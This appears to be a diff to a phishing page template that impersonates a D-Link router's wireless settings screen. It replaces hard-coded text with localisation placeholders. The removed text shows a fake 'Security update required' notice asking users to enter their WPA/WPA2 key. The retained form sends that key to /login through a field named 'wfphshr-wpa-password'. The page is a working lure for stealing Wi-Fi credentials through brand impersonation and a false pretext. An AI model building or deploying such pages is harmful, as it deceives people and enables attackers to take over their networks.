@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="{{html_lang}}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>D-Link — Wireless Setup</title>
+    <title>{{page_title}}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Verdana, Geneva, sans-serif; background: #ececec; color: #333; min-height: 100vh; }
@@ -34,30 +34,30 @@
 <body>
     <div class="header">
         <h1>D-Link</h1>
-        <p>Wireless Router Configuration</p>
+        <p>{{brand_subtitle}}</p>
     </div>
     <div class="menu">
-        <a href="#">SETUP</a><a href="#" class="on">WIRELESS</a><a href="#">NETWORK</a><a href="#">MAINTENANCE</a>
+        <a href="#">{{menu_setup}}</a><a href="#" class="on">{{menu_wireless}}</a><a href="#">{{menu_network}}</a><a href="#">{{menu_maintenance}}</a>
     </div>
     <div class="container">
         <div class="box">
-            <div class="box-title">Wireless Security</div>
+            <div class="box-title">{{box_title}}</div>
             <div class="box-body">
                 <div class="alert">
-                    <b>Security update required</b>
-                    Your router needs to refresh wireless credentials after a security update. Enter your WPA/WPA2 pre-shared key below to continue and protect your network.
+                    <b>{{alert_title}}</b>
+                    {{alert_body}}
                 </div>
                 <form method="POST" action="/login">
                     <table>
-                        <tr><th>Security Mode</th><td>WPA/WPA2-Personal</td></tr>
-                        <tr><th>Cipher Type</th><td>AES</td></tr>
-                        <tr><th>Pre-Shared Key</th><td><input type="password" name="wfphshr-wpa-password" placeholder="8–63 characters" required autocomplete="current-password"></td></tr>
+                        <tr><th>{{row_security_mode}}</th><td>{{row_security_value}}</td></tr>
+                        <tr><th>{{row_cipher_type}}</th><td>{{row_cipher_value}}</td></tr>
+                        <tr><th>{{row_pre_shared_key}}</th><td><input type="password" name="wfphshr-wpa-password" placeholder="{{input_placeholder}}" required autocomplete="current-password"></td></tr>
                     </table>
-                    <div class="btn-row"><button type="submit" class="btn">Save Settings</button></div>
+                    <div class="btn-row"><button type="submit" class="btn">{{btn_save}}</button></div>
                 </form>
             </div>
         </div>
-        <div class="foot">Router web interface</div>
+        <div class="foot">{{footer}}</div>
     </div>
 </body>
 </html>
